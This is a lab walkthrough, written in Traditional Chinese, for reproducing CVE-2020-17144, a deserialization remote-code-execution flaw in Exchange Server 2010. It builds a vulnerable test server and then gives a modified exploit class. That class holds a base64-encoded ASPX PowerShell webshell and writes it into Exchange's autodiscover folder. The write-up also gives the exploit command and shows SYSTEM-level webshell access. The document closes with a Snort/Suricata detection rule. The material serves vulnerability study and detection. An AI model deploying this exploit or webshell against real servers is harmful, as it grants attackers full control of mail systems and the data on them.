# 0x0 前言
### CVE-2020-17144 Description  
No description from NVD.

### Exchange Server
Microsoft Exchange Server is a mail server and calendaring server developed by Microsoft. It runs exclusively on Windows Server operating systems.

### 原理簡介
Exchange 2010中設計了一個機器學習功能為郵件自動標記標籤。機器學習將生成模型，模型資訊將儲存至收件箱的使用者配置中。  
  
自動標記功能預設不會開啟，但在使用者**修改模型配置**和**郵箱助手啟動**時均會觸發郵箱助理載入模型，且在反序列化使用者配置時沒有SerializationBinder限制載入物件，造成RCE。

### 情境
攻擊者須先取得一組mail帳密，透過修改使用者模型配置時注入含有惡意內容的檔案，再access該檔案達成RCE。

* ()內為測試時使用之環境
* <>為可變動或需視使用環境變動的欄位
* `斜體字`為指令


# 0x1 前置需求
* 虛擬機軟體 (VMware Workstation 15.5.7)
* 攻擊機 (Windows 10 x64)
* 受攻擊機 (Windows Server 2012 R2)


# 0x2 受攻擊機環境建置
## 搭建Exchange Server

### 安裝相依套件
1. 開啟powershell，輸入`Add-WindowsFeature NET-Framework-Core,RSAT-ADDS,Web-Server,Web-Basic-Auth,Web-Windows-Auth,Web-Metabase,Web-Net-Ext,Web-Lgcy-Mgmt-Console,WAS-Process-Model,Web-Mgmt-Tools,Web-ISAPI-Ext,Web-Digest-Auth,Web-Dyn-Compression,NET-HTTP-Activation,Web-Asp-Net,Web-Client-Auth,Web-Dir-Browsing,Web-Http-Errors,Web-Http-Logging,Web-Http-Redirect,Web-Http-Tracing,Web-ISAPI-Filter,Web-Request-Monitor,Web-Static-Content,Web-WMI,RPC-Over-HTTP-Proxy –Restart`，安裝.NET等等相依套件
![](image/2.1.PNG)

### 安裝Office 2010 Filter Packs
2. 下載Microsoft Office 2010 Filter Packs 64-bit (https://www.microsoft.com/en-us/download/details.aspx?id=17062) 並安裝

3. 下載Microsoft Office 2010 Filter Packs SP2 64-bit (https://www.microsoft.com/en-us/download/details.aspx?id=39668) 並安裝

### 安裝AD DS
4. 開啟Server Manager，點選**Add roles and features**  
![](image/2.4_add_roles.PNG)

5. Next  
![](image/2.5.PNG)

6. Next  
![](image/2.6.PNG)

7. Next  
![](image/2.7.PNG)

8. 勾選**Active Directory Domain Services** > Next  
![](image/2.8.PNG)

9. 勾選.NET 3.5 > Next  
![](image/2.9.PNG)

10. Next  
![](image/2.10.PNG)

11. Install  
![](image/2.11.PNG)

12. 等待安裝完成 > Close  
![](image/2.12.PNG)

### 移除Active Directory Certification Authority (若到2.16發現原本就沒有安裝則可跳過此部分)
13. Manage > **Remove roles and features**  
![](image/2.13.PNG)

14. Next  
![](image/2.14.PNG)

15. Next  
![](image/2.15.PNG)

16. 取消勾選**Certification Authority** > Next  
![](image/2.16.PNG)

17. Next  
![](image/2.17.PNG)

18. Remove  
![](image/2.18.PNG)

19. 等待移除完成 > Close  
![](image/2.19.PNG)

### 提升AD DS為domain controller
20. 右上角有驚嘆號的旗子 > **Promote this server to a domain controller**  
![](image/2.20.PNG)

21. 勾選**Add a new forest** > Root domain name隨意 > Next    
![](image/2.21.PNG)

22. 密碼隨意(vulner1%%) > Next  
![](image/2.22.PNG)

23. Next  
![](image/2.23.PNG)

24. Next  
![](image/2.24.PNG)

25. Next  
![](image/2.25.PNG)

26. Next  
![](image/2.26.PNG)

27. Install  
![](image/2.27.PNG)

28. 等待安裝完成 > 重新登入  
![](image/2.28.PNG)

29. 重新登入後需要重設密碼(from **vulner1%** to **vulner1%%**)  
![](image/2.29.PNG)

### 安裝Web Server (IIS)
與AD DS安裝方法相同

### 安裝Exchange Server
30. 下載Exchange Server 2010 SP3 (https://www.microsoft.com/zh-tw/download/details.aspx?id=36768) 並解壓縮

31. 找到setup並點兩下執行  
![](image/2.31.PNG)

32. 點選Step 4.  
![](image/2.32.PNG)

33. Next  
![](image/2.33.PNG)

34. accept > Next  
![](image/2.34.PNG)

35. Next  
![](image/2.35.PNG)

36. Next  
![](image/2.36.PNG)

37. Name隨意 > Next  
![](image/2.37.PNG)

38. Next  
![](image/2.38.PNG)

39. Next  
![](image/2.39.PNG)

40. don't want to join > Next  
![](image/2.40.PNG)

41. 正確應該要全部Complete如下圖，但我兩次重現時在這步皆遇到不同的問題，會導致最後兩項Fail，如果發生了可以試試安裝DNS(安裝方法同AD DS)、重開機、take snapshot切換到別的snapshot再切回來  
![](image/2.41.PNG)

42. 等待安裝完成 > Finish > 重開機  
![](image/2.42.PNG)

43. 開啟瀏覽器，於網址列輸入`https://127.0.0.1/owa`可以看到outlook登入畫面，輸入虛擬機帳密(administrator/vulner1%%，帳號是固定的，密碼是2.29步設的)就能夠登入  
![](image/2.43.PNG)


# 0x3 攻擊機環境建置
### 安裝Visual Studio (Visual Studio Community 2017 version 15.9)
1. 下載 (https://my.visualstudio.com/Downloads?q=visual%20studio%202017&wt.mc_id=o~msft~vscom~older-downloads) 並安裝

### 安裝.NET 3.5
2. 下載 (https://www.microsoft.com/zh-tw/download/details.aspx?id=21) 並安裝

### 編譯Exploit script
3. 下載Exploit script (https://github.com/Airboi/CVE-2020-17144-EXP) 並解壓縮

4. 修改/CVE-2020-17144/ExploitClass.cs line 14與line 20如下 (data payload是由 https://github.com/ThePacketBender/webshells/blob/master/POWERshell.aspx 經過base64encode而來)
```c#
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace exploit
{
    class ExploitClass
    {
        public ExploitClass()
        {

            string data = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsIiU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uIiU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcyIlPgo8JUAgQXNzZW1ibHkgTmFtZT0iU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbixWZXJzaW9uPTEuMC4wLjAsQ3VsdHVyZT1uZXV0cmFsLFB1YmxpY0tleVRva2VuPTMxQkYzODU2QUQzNjRFMzUiJT4KCjwhRE9DVFlQRSBodG1sPgoKPHNjcmlwdCBMYW5ndWFnZT0iYyMiIHJ1bmF0PSJzZXJ2ZXIiPgogICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIHBvd2Vyc2hlbGxlZChzdHJpbmcgc2NyaXB0VGV4dCkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFJ1bnNwYWNlIHJ1bnNwYWNlID0gUnVuc3BhY2VGYWN0b3J5LkNyZWF0ZVJ1bnNwYWNlKCk7CiAgICAgICAgICAgIHJ1bnNwYWNlLk9wZW4oKTsKICAgICAgICAgICAgUGlwZWxpbmUgcGlwZWxpbmUgPSBydW5zcGFjZS5DcmVhdGVQaXBlbGluZSgpOwogICAgICAgICAgICBwaXBlbGluZS5Db21tYW5kcy5BZGRTY3JpcHQoc2NyaXB0VGV4dCk7CiAgICAgICAgICAgIHBpcGVsaW5lLkNvbW1hbmRzLkFkZCgiT3V0LVN0cmluZyIpOwogICAgICAgICAgICBDb2xsZWN0aW9uPFBTT2JqZWN0PiByZXN1bHRzID0gcGlwZWxpbmUuSW52b2tlKCk7CiAgICAgICAgICAgIHJ1bnNwYWNlLkNsb3NlKCk7CiAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc3RyaW5nQnVpbGRlciA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CiAgICAgICAgICAgIGZvcmVhY2ggKFBTT2JqZWN0IG9iaiBpbiByZXN1bHRzKQogICAgICAgICAgICAgICAgc3RyaW5nQnVpbGRlci5BcHBlbmRMaW5lKG9iai5Ub1N0cmluZygpKTsKICAgICAgICAgICAgcmV0dXJuIHN0cmluZ0J1aWxkZXIuVG9TdHJpbmcoKTsKICAgICAgICB9Y2F0Y2goRXhjZXB0aW9uIGV4Y2VwdGlvbikKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiBzdHJpbmcuRm9ybWF0KCJFcnJvcjogezB9IiwgZXhjZXB0aW9uLk1lc3NhZ2UpOwogICAgICAgIH0KICAgIH0KICAgIAogICAgcHJvdGVjdGVkIHZvaWQgUGFnZV9Mb2FkKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIGlmIChQYWdlLklzUG9zdEJhY2spCiAgICAgICAgewogICAgICAgICAgICBpZihpVEJveC5UZXh0Lkxlbmd0aCA+IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIG9UQm94LlRleHQgPSBwb3dlcnNoZWxsZWQoaVRCb3guVGV4dC5UcmltKCkpOwogICAgICAgICAgICAgICAgaVRCb3guVGV4dCA9IHN0cmluZy5FbXB0eTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KPC9zY3JpcHQ+Cgo8aHRtbD4KPGhlYWQgaWQ9IkQzNGRIZWFkIiBydW5hdD0ic2VydmVyIj4KICAgIDx0aXRsZT5QT1dFUiFzaGVsbGVkPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxmb3JtIGlkPSJmb3JtMSIgcnVuYXQ9InNlcnZlciI+ICAgIAogICAgICAgIDxzcGFuPkluZGV4IDwvc3Bhbj4KICAgICAgICA8c3Bhbj5QT1dFUiF3ZWJzaGVsbDwvc3Bhbj4+PGJyIC8+CiAgICA8YXNwOlRleHRCb3ggSUQ9Im9UQm94IiBydW5hdD0ic2VydmVyIiBCYWNrQ29sb3I9IkJsYWNrIiAKICAgICAgICBIZWlnaHQ9IjQ4MHB4IiBSZWFkT25seT0iVHJ1ZSIgVGV4dE1vZGU9Ik11bHRpTGluZSIgRm9yZWNvbG9yPSJHcmVlbiIKICAgICAgICBXaWR0aD0iMTIwMHB4IiBUb29sVGlwPSJQT1dFUiFzaGVsbCBvdXRwdXQiPjwvYXNwOlRleHRCb3g+CiAgICA8YnIgLz4KICAgIDxhc3A6VGV4dEJveCBJRD0iaVRCb3giIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSIxMjAwcHgiIAogICAgICAgIFRvb2xUaXA9IjxQT1dFUiFzaGVsbCBjb21tYW5kPiI+PC9hc3A6VGV4dEJveD4KICAgIDwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+";

            try
            {
                // Payload code to be executed
                //System.Diagnostics.Process.Start("calc.exe");
                System.IO.File.WriteAllText(@"C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\autodiscover\Services.aspx", System.Text.Encoding.GetEncoding("utf-8").GetString(Convert.FromBase64String(data)));
            }
            catch (Exception)
            {
            }
        }
    }
}
```

5. 使用**Visual Studio**開啟資料夾  
![](image/3.5.PNG)

6. 右鍵點擊**CVE-2020-17144.sln** > 組建  
![](image/3.6.PNG)

### Exploit
7. 可以看到多出了新的路徑\CVE-2020-17144-EXP-master\CVE-2020-17144\bin\Debug，開啟cmd執行`CVE-2020-17144.exe <受害機IP> administrator <密碼(vulner1%%)>`，成功畫面如下  
![](image/3.7.PNG)

8. 開起瀏覽器，於網址列輸入`https://192.168.153.141/autodiscover/Services.aspx`，webshell畫面如下，可以看到取得的是system權限(經測試若上一步使用的是一般使用者帳密，取得的同樣是SYSTEM權限)  
![](image/3.8.PNG)


# 0x4 Snort/Suricata Rule
1. alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"SERVER-OTHER Microsoft Exchange Server 2010 deserialization attempt"; flow:to_server,established; content:"/EWS/Exchange.asmx"; fast_pattern:only; http_uri; content:"<m:UserConfiguration>"; nocase; http_client_body; content:"MRM.AutoTag.Model"; nocase; http_client_body; content:"BinaryData>"; base64_decode:bytes 2000,relative; base64_data; content:"System.Collections.Generic"; nocase; content:"MZ"; metadata:policy max-detect-ips drop, service http; reference:cve,2020-17144; reference:url,portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-17144; classtype:attempted-user; sid:56554; rev:1;)


# 0x5 Reference
* https://blog.csdn.net/m0_48520508/article/details/111934211
* https://www.cnblogs.com/k8gege/p/14111835.html
* https://www.mdeditor.tw/pl/gkyo/zh-tw
* https://github.com/Airboi/CVE-2020-17144-EXP
* https://vimeo.com/488636061
* https://blog.rmilne.ca/2019/02/27/installing-exchange-2010-on-windows-server-2012-r2/
* https://www.youtube.com/watch?v=6Z4K-Tgo-z8&ab_channel=BTNHD
* https://docs.microsoft.com/zh-tw/windows-server/identity/ad-ds/deploy/install-a-new-windows-server-2012-active-directory-forest--level-200-
* https://github.com/ThePacketBender/webshells



